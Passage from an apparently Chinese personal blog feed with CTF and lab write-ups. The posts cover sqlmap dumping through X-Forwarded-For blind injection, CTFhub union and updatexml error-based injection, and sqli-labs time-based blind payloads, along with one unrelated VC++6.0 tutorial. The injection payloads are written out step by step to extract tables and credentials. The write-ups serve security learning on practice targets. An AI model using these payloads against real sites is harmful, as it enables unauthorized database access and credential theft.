src="https://img-blog.csdnimg.cn/20200815000808909.jpg?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ1ODM2NDc0,size_16,color_FFFFFF,t_70#pic_center" alt="m0re" loading="lazy"></p><p>最后这个有个高危漏洞，是个盲注。详细信息继续查看。<br>看出是关于X-Forwarded-For报头注入的一个SQL盲注漏洞。<br><img src="https://img-blog.csdnimg.cn/20200815000819696.jpg?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ1ODM2NDc0,size_16,color_FFFFFF,t_70#pic_center" alt="m0re" loading="lazy"></p><p> 使用sqlmap进行探测，就可以得到数据库中的数据了。</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">sqlmap -u <span class="string">&quot;http://10.0.2.10&quot;</span> --headers=<span class="string">&quot;X-Forwarded-For:*&quot;</span> --dbs --batch</span><br><span class="line">sqlmap -u <span class="string">&quot;http://10.0.2.10&quot;</span> --headers=<span class="string">&quot;X-Forwarded-For:*&quot;</span> -D <span class="string">&quot;photoblog&quot;</span> --tables --batch</span><br><span class="line">sqlmap -u <span class="string">&quot;http://10.0.2.10&quot;</span> --headers=<span class="string">&quot;X-Forwarded-For:*&quot;</span> -D <span class="string">&quot;photoblog&quot;</span> -T <span class="string">&quot;users&quot;</span> --columns --batch</span><br><span class="line">sqlmap -u <span class="string">&quot;http://10.0.2.10&quot;</span> --headers=<span class="string">&quot;X-Forwarded-For:*&quot;</span> -D <span class="string">&quot;photoblog&quot;</span> -T <span class="string">&quot;users&quot;</span> -C <span class="string">&quot;login,password&quot;</span> --dump --batch</span><br></pre></td></tr></table></figure><p>按照套路来就行，最后测出数据<br><img src="https://img-blog.csdnimg.cn/20200815000835969.jpg?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ1ODM2NDc0,size_16,color_FFFFFF,t_70#pic_center" alt="m0re" loading="lazy"></p><p>账号密码进行登录<br>然后就是老套路，上传webshell，连接，提权等操作。</p>]]></content>
      
      
      
        <tags>
            
            <tag> CTF靶场系列 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>VC++6.0初学使用教程</title>
      <link href="/2020/08/23/VC++6.0%E5%88%9D%E5%AD%A6%E4%BD%BF%E7%94%A8%E6%95%99%E7%A8%8B/"/>
      <url>/2020/08/23/VC++6.0%E5%88%9D%E5%AD%A6%E4%BD%BF%E7%94%A8%E6%95%99%E7%A8%8B/</url>
      
        <content type="html"><![CDATA[<p>这次介绍一个编译器的初学者使用教程，一般用这个就是来编译C++，当然也可以编译C语言，这个编译器要比codeblocks操作起来费力一点。好了，步入正题！！！（2020.8.23————这篇文章确实是水了，为室友写的教程，请忽略）<br><strong>安装vc++6.0</strong><br>这里我提供下安装包文件：<br>百度网盘链接：<a href="https://pan.baidu.com/s/1mDHZYIhLsR-125M3vb7DYA">https://pan.baidu.com/s/1mDHZYIhLsR-125M3vb7DYA</a><br>提取码：sgv5<br>需要请自取。！！！<br>安装过程也不多说。<br><strong>使用</strong><br>1.打开vc++6.0后是这个样子的：<br><img src="https://img-blog.csdnimg.cn/20200219152451827.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ1ODM2NDc0,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述" loading="lazy"><br>2.点击Fire——新建<br>点开“工程”，选择<code>Win32 Console Application</code>,平台的位置会出现<code>Win32</code>，编写一个工程名称。然后确定就🆗了！！像下面这张图一样！！！<br><img src="https://img-blog.csdnimg.cn/20200219152626968.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ1ODM2NDc0,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述" loading="lazy"><br>3.确定后出现了下面这张图所表示的样子，选择默认选项——<code>一个空工程</code>点击完成就行了。<br><img src="https://img-blog.csdnimg.cn/20200219153448842.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ1ODM2NDc0,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述" loading="lazy"><br>4.然后不用管它，点击确定，新工程就创建完成了。<br><img src="https://img-blog.csdnimg.cn/20200219153739997.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ1ODM2NDc0,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述" loading="lazy"><br>5.完成上一步后，会回到最初的页面，然后再点击Fire——新建，选择文件，出现下图页面，选择<code>C++ Source Fire</code>，文件名想起什么起什么。点确定！！！<br><img src="https://img-blog.csdnimg.cn/20200219153908750.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ1ODM2NDc0,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述" loading="lazy"><br>6.然后新项目就创建好了。<br><img src="https://img-blog.csdnimg.cn/20200219155100857.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ1ODM2NDc0,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述" loading="lazy"><br>到这里，创建新项目就完成了，可以编写代码运行试试啦！！！<br><img src="https://img-blog.csdnimg.cn/20200219160715640.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ1ODM2NDc0,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述" loading="lazy"><br>还有就是关闭软件后第二次打开的问题，这个补充一下，第二次打开VC++6.0不用再重新创建新的工程了，可以打开之前创建的工程,步骤如下：<br><img src="https://img-blog.csdnimg.cn/20200222111620969.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ1ODM2NDc0,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述" loading="lazy"><br>直接看步骤，这里不加文字说明了<br><img src="https://img-blog.csdnimg.cn/20200222111728441.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ1ODM2NDc0,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述" loading="lazy"><br><img src="https://img-blog.csdnimg.cn/2020022211180758.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ1ODM2NDc0,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述" loading="lazy"><br>OK，这就打开了。<br>亲测有效！</p>]]></content>
      
      
      
        <tags>
            
            <tag> 水文 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>SQL注入————整数型、报错型</title>
      <link href="/2020/08/23/SQL%E6%B3%A8%E5%85%A5%E2%80%94%E2%80%94%E6%95%B4%E6%95%B0%E5%9E%8B%E6%B3%A8%E5%85%A5%E3%80%81%E6%8A%A5%E9%94%99%E6%B3%A8%E5%85%A5/"/>
      <url>/2020/08/23/SQL%E6%B3%A8%E5%85%A5%E2%80%94%E2%80%94%E6%95%B4%E6%95%B0%E5%9E%8B%E6%B3%A8%E5%85%A5%E3%80%81%E6%8A%A5%E9%94%99%E6%B3%A8%E5%85%A5/</url>
      
        <content type="html"><![CDATA[<h2 id="整数型注入"><a href="#整数型注入" class="headerlink" title="整数型注入"></a>整数型注入</h2><p>在CTFhub上的一道整数型注入的题，刚接触SQL注入，这也是我第一次做整数型注入的题，做个记录。<br>开启环境：<br><img src="https://img-blog.csdnimg.cn/20200310214847879.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ1ODM2NDc0,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述" loading="lazy"><br>先判断是否存在注入<br>payload：</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?id=1 and 1=1</span><br></pre></td></tr></table></figure><p><img src="https://img-blog.csdnimg.cn/20200310215948213.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ1ODM2NDc0,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述" loading="lazy"><br>payload：</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?id=1 and 1=2</span><br></pre></td></tr></table></figure><p><img src="https://img-blog.csdnimg.cn/20200310215917833.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ1ODM2NDc0,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述" loading="lazy"><br>证明存在注入，那就搞它！<br>输入1试试，有回显。<br><img src="https://img-blog.csdnimg.cn/20200310214905824.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ1ODM2NDc0,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述" loading="lazy"><br>判断字段数 payload：</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?id=1 order by 1</span><br></pre></td></tr></table></figure><p><img src="https://img-blog.csdnimg.cn/20200310215241185.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ1ODM2NDc0,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述" loading="lazy"><br>再输入2,3挨个试<br>payload：</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?id=1 order by 3</span><br></pre></td></tr></table></figure><p><img src="https://img-blog.csdnimg.cn/20200310215220476.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ1ODM2NDc0,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述" loading="lazy"><br>发现这里报错了，所以判断字段数只有2<br>爆数据库：payload：</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?id=1 and 1=2 union <span class="keyword">select</span> <span class="number">1</span>,<span class="keyword">database</span>()</span><br></pre></td></tr></table></figure><p><img src="https://img-blog.csdnimg.cn/20200310215327452.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ1ODM2NDc0,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述" loading="lazy"><br>爆出数据库名为<code>sqli</code><br>爆表名：</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line">?id=1 and 1=2 union <span class="keyword">select</span> <span class="number">1</span>,<span class="keyword">group_concat</span>(table_name)<span class="keyword">from</span> information_schema.tables <span class="keyword">where</span> table_schema=<span class="string">&#x27;sqli&#x27;</span></span><br></pre></td></tr></table></figure><p><img src="https://img-blog.csdnimg.cn/20200310215403271.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ1ODM2NDc0,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述" loading="lazy"><br>爆出两个表，一个<code>news</code>一个<code>flag</code>很明显，flag就藏在这里了。<br>爆字段名：</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?id=1 and 1=2 union <span class="keyword">select</span> <span class="number">1</span>,<span class="keyword">group_concat</span>(column_name) <span class="keyword">from</span> information_schema.columns <span class="keyword">where</span> table_name=<span class="string">&#x27;flag&#x27;</span></span><br></pre></td></tr></table></figure><p><img src="https://img-blog.csdnimg.cn/20200310215728850.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ1ODM2NDc0,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述" loading="lazy"><br>字段名还是<code>flag</code>最后一步爆值：<br>payload：</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?id=1 and 1=2 union <span class="keyword">select</span> <span class="number">1</span>,<span class="keyword">group_concat</span>(flag) <span class="keyword">from</span> sqli.flag</span><br></pre></td></tr></table></figure><p><img src="https://img-blog.csdnimg.cn/20200310215758262.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ1ODM2NDc0,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述" loading="lazy"><br>flag出来了。get！！！</p><h2 id="报错注入"><a href="#报错注入" class="headerlink" title="报错注入"></a>报错注入</h2><p>报错注入就是通过反馈出来的错误来获取到我们所需要的信息。<br><strong>updatexml报错注入</strong><br>这是我在网上了解到的一种报错注入方式。报错注入原来有好多种办法，这里主要解释这个updatexml报错注入，先介绍updatexml报错的原理：我是一个小白，也不懂什么是updataxml函数，网上查呗看了好几篇博客，也没搞明白updataxml函数，大家写的都一样，反正就是在脚本之家上找到了原版<br><img src="https://img-blog.csdnimg.cn/20200314180756881.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ1ODM2NDc0,size_16,color_FFFFFF,t_70" alt="来自脚本之家" loading="lazy"><br>Xpath 语法是要单独去学的，不过没必要，了解一下就行（我是了解都没了解，直接记的。🤣🤣🤣我懒，嫌麻烦。）<br>然后看到了示例的updataxml函数语句，我疑问更多了。<br>payload：</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">id=1 and (updatexml(1,concat(0x7e,(<span class="keyword">select</span> <span class="keyword">user</span>()),<span class="number">0x7e</span>),<span class="number">1</span>));</span><br></pre></td></tr></table></figure><p>呐，我更疑惑了，一看这句，不知道有没有跟我内心活动相同的。（我<em>，0x7e又是什么？？？？上面还有好多没搞明白的，又来一个。****</em>直接口吐芬芳）<br><code>0x7e</code>我查的是在SQL中的报错什么的，我也不明白，有兴趣的可以百度看看。看的头懵。<br>updatexml第二个参数需要的是Xpath格式的字符串，但是我们第二个参数如果不是Xpath格式，而是我们想要获得的数据，那么它就会报错，并且在报错的时候会将错的内容显示出来，然后我们就可以获得我们想要的数据了。原理差不多就是这个。<br>算啦，实在搞不明白不搞了，直接用吧</p><h5 id="实战CTFhub的题"><a href="#实战CTFhub的题" class="headerlink" title="实战CTFhub的题"></a>实战CTFhub的题</h5><p>开启环境（熟门熟路，不知道开过几次了，看大佬的博客一看就会，一做就废。😥😥😥关键是这玩意而氪金）</p><p><img src="https://img-blog.csdnimg.cn/20200314170945191.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ1ODM2NDc0,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述" loading="lazy"><br>那就输入1试试，查询正确了<br><img src="https://img-blog.csdnimg.cn/20200314171040711.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ1ODM2NDc0,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述" loading="lazy"><br>之前没有做过报错的题，这是第一个！！！<br>该用到updatexml函数了payload：</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?id=1 and (updatexml(1,concat(0x7e,(<span class="keyword">select</span> <span class="keyword">database</span>()),<span class="number">0x7e</span>),<span class="number">1</span>));</span><br></pre></td></tr></table></figure><p><img src="https://img-blog.csdnimg.cn/2020031417125212.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ1ODM2NDc0,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述" loading="lazy"><br>不出所料得到了我们想要的数据库名<code>sqli</code><br>继续payload：</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?id=1 and (updatexml(1,concat(0x7e,(<span class="keyword">select</span> <span class="keyword">group_concat</span>(table_name) <span class="keyword">from</span> information_schema.tables <span class="keyword">where</span> table_schema=<span class="string">&#x27;sqli&#x27;</span>),<span class="number">0x7e</span>),<span class="number">1</span>));</span><br></pre></td></tr></table></figure><p><img src="https://img-blog.csdnimg.cn/20200314171356125.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ1ODM2NDc0,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述" loading="lazy"><br>信息显示sqli下的两个表是<code>news</code>和<code>flag</code><br>payload：</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">id=1 and (updatexml(1,concat(0x7e,(<span class="keyword">select</span> <span class="keyword">group_concat</span>(column_name) <span class="keyword">from</span> information_schema.columns <span class="keyword">where</span> table_name=<span class="string">&#x27;flag&#x27;</span>),<span class="number">0x7e</span>),<span class="number">1</span>));</span><br></pre></td></tr></table></figure><p><img src="https://img-blog.csdnimg.cn/20200314171606649.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ1ODM2NDc0,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述" loading="lazy"><br>payload：</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">id=1 and (updatexml(1,concat(0x7e,(<span class="keyword">select</span> <span class="keyword">group_concat</span>(flag) <span class="keyword">from</span> flag),<span class="number">0x7e</span>),<span class="number">1</span>));</span><br></pre></td></tr></table></figure><p><img src="https://img-blog.csdnimg.cn/20200314171717106.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ1ODM2NDc0,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述" loading="lazy"><br>查询出来flag了，不过好像不完整。有一个坑？？？？why。<br><img src="https://img-blog.csdnimg.cn/20200314183503358.jpg" alt="在这里插入图片描述" loading="lazy"><br>心态崩了啊。还要再查，查查查………………烦，不过还好找到了，<strong>xpath报错只显示32位结果</strong>然后要用到另一个函数mid。<strong>需要借助mid函数来进行字符截取从而显示32位以后的数据。</strong>找找mid函数的用法（因为大佬没有解释，只说了怎么用。）还是亲爱的度娘比较贴心。😭😭😭😭<br><img src="https://img-blog.csdnimg.cn/20200314184144714.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ1ODM2NDc0,size_16,color_FFFFFF,t_70" alt="来自百度百科" loading="lazy"><br>好嘞，这下就懂了。可以继续了，what？？环境到期了，😭😭😭又要花金币。赶紧的，不磨蹭了。<br>payload：</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">id=1 and (updatexml(1,concat(0x7e,mid((<span class="keyword">select</span> <span class="keyword">group_concat</span>(flag) <span class="keyword">from</span> flag),<span class="number">32</span>),<span class="number">0x7e</span>),<span class="number">1</span>));</span><br></pre></td></tr></table></figure><p><img src="https://img-blog.csdnimg.cn/20200314171847891.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ1ODM2NDc0,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述" loading="lazy"><br>最后汇总flag：ctfhub{21129dbb7c5caaba20b91e9f8d3018104fe54fcd}<br>呼……真巴适哈哈哈。<img src="https://img-blog.csdnimg.cn/20200314184539198.gif" alt="在这里插入图片描述" loading="lazy"><br>最后再附上大佬博客<a href="https://www.cnblogs.com/wocalieshenmegui/p/5917967.html">十种MySQL报错注入</a><br>还有这个<a href="https://www.freebuf.com/column/150475.html">CTF中的SQL注入</a></p>]]></content>
      
      
      
        <tags>
            
            <tag> SQL注入 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>SQL注入————sqli-labs靶场闯关</title>
      <link href="/2020/08/23/SQL%E6%B3%A8%E5%85%A5%E2%80%94%E2%80%94sqli-labs%E9%9D%B6%E5%9C%BA%E9%97%AF%E5%85%B3(13-20)/"/>
      <url>/2020/08/23/SQL%E6%B3%A8%E5%85%A5%E2%80%94%E2%80%94sqli-labs%E9%9D%B6%E5%9C%BA%E9%97%AF%E5%85%B3(13-20)/</url>
      
        <content type="html"><![CDATA[<p>前言：SQL注入必须要拿下，所以继续学习并在靶场实验。有些关卡学习新的知识点，都在中间穿插着。比如18,19关等。</p><h2 id="Less-13"><a href="#Less-13" class="headerlink" title="Less-13"></a>Less-13</h2><p>判断闭合符号，输入一个反斜扛<code>\</code>来试试<br><img src="https://img-blog.csdnimg.cn/20200430103523785.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ1ODM2NDc0,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述" loading="lazy"><br>可以看出是<code>&#39;)</code>闭合，然后开始注入<br>第一种、基于报错的注入<br>先抓包，然后send to repeater<br>构造SQL语句</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">uname=admin&#x27;) and updatexml(1,concat(0x7e,(<span class="keyword">select</span> <span class="keyword">database</span>()),<span class="number">0x7e</span>),<span class="number">1</span>) <span class="comment">--+&amp;passwd=admin&amp;submit=Submit</span></span><br></pre></td></tr></table></figure><p><img src="https://img-blog.csdnimg.cn/20200430230106332.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ1ODM2NDc0,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述" loading="lazy"><br>这个报错语句是我刚学的，个人认为比较好记哈。<br>然后进行表的查询</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">uname=admin&#x27;) and updatexml(1,concat(0x7e,(<span class="keyword">select</span> table_name <span class="keyword">from</span> information_schema.tables <span class="keyword">where</span> table_schema=<span class="keyword">database</span>() <span class="keyword">limit</span> <span class="number">1</span>,<span class="number">1</span>),<span class="number">0x7e</span>),<span class="number">1</span>) <span class="comment">--+&amp;passwd=admin&amp;submit=Submit</span></span><br></pre></td></tr></table></figure><p>还是利用limit来控制查询的表。一步一步找到我们想要的<code>users</code>表<br><img src="https://img-blog.csdnimg.cn/20200430230241225.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ1ODM2NDc0,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述" loading="lazy"></p><p>其他的不再重复。参考第十一关。</p><h2 id="Less-14"><a href="#Less-14" class="headerlink" title="Less-14"></a>Less-14</h2><p>依旧是判断闭合符号，输入一个反斜扛，看到是双引号闭合。<br><img src="https://img-blog.csdnimg.cn/20200430105527383.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ1ODM2NDc0,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述" loading="lazy"><br>其他没什么，就跟上一关一样了。<br>抓包，构造SQL语句</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">uname=admin&quot; and updatexml(1,concat(0x7e,(<span class="keyword">select</span> <span class="keyword">database</span>()),<span class="number">0x7e</span>),<span class="number">1</span>) <span class="comment">--+&amp;passwd=admin&amp;submit=Submit</span></span><br></pre></td></tr></table></figure><p>不再重复。</p><h2 id="Less-15"><a href="#Less-15" class="headerlink" title="Less-15"></a>Less-15</h2><p>输入反斜扛进行判断，发现没有回显，考虑是时间型盲注。<br>先抓包，发送Repeater慢慢注。<br>先Go一下，发现加载页面加载了1秒左右，然后构造SQL语句</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">uname=admin&#x27; and 1=1<span class="comment">--+&amp;passwd=admin&amp;submit=Submit //登录成功了，可以说明是单引号闭合</span></span><br></pre></td></tr></table></figure><p>构造payload</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">uname=admin&#x27; and sleep(5) <span class="comment">--+&amp;passwd=admin&amp;submit=Submit</span></span><br></pre></td></tr></table></figure><p><img src="https://img-blog.csdnimg.cn/20200430230605158.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ1ODM2NDc0,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述" loading="lazy"></p><p>然后可以构造其他的语句来判断并爆出数据库名(一步一步来是真累)。<br>判断数据库名长度</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">uname=admin&#x27; and if(length(database())=8,sleep(5),1)<span class="comment">--+&amp;passwd=admin&amp;submit=Submit</span></span><br></pre></td></tr></table></figure><p>判断数据库名</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">uname=admin&#x27; and if(left(database(),1)=&#x27;s&#x27;,sleep(5),1)<span class="comment">--+&amp;passwd=admin&amp;submit=Submit</span></span><br></pre></td></tr></table></figure><p>判断表名</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">uname=admin&#x27; and if( left((<span class="keyword">select</span> table_name <span class="keyword">from</span> information_schema.tables <span class="keyword">where</span> table_schema=<span class="keyword">database</span>() <span class="keyword">limit</span> <span class="number">1</span>,<span class="number">1</span>),<span class="number">1</span>)=<span class="string">&#x27;r&#x27;</span> ,<span class="keyword">sleep</span>(<span class="number">5</span>),<span class="number">1</span>)<span class="comment">--+&amp;passwd=admin&amp;submit=Submit</span></span><br></pre></td></tr></table></figure><p>limit一个一个查出我想要的表名，</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">uname=admin&#x27; and if(left((<span class="keyword">select</span> column_name <span class="keyword">from</span> information_schema.columns <span class="keyword">where</span> table_name=<span class="string">&#x27;users&#x27;</span> <span class="keyword">limit</span> <span class="number">4</span>,<span class="number">1</span>),<span class="number">8</span>)=<span class="string">&#x27;password&#x27;</span> ,<span class="keyword">sleep</span>(<span class="number">5</span>),<span class="number">1</span>)<span class="comment">--+&amp;passwd=admin&amp;submit=Submit</span></span><br></pre></td></tr></table></figure><p><img src="https://img-blog.csdnimg.cn/20200430230739842.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ1ODM2NDc0,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述" loading="lazy"></p><p>判断列名</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">uname=admin&#x27; and if(left((<span class="keyword">select</span> <span class="keyword">password</span> <span class="keyword">from</span> <span class="keyword">users</span> <span class="keyword">order</span> <span class="keyword">by</span> <span class="keyword">id</span> <span class="keyword">limit</span> <span class="number">0</span>,<span class="number">1</span>),<span class="number">4</span>)=<span class="string">&#x27;dumb&#x27;</span> ,<span class="keyword">sleep</span>(<span class="number">5</span>),<span class="number">1</span>)<span class="comment">--+&amp;passwd=admin&amp;submit=Submit</span></span><br></pre></td></tr></table></figure><p>爆值</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span 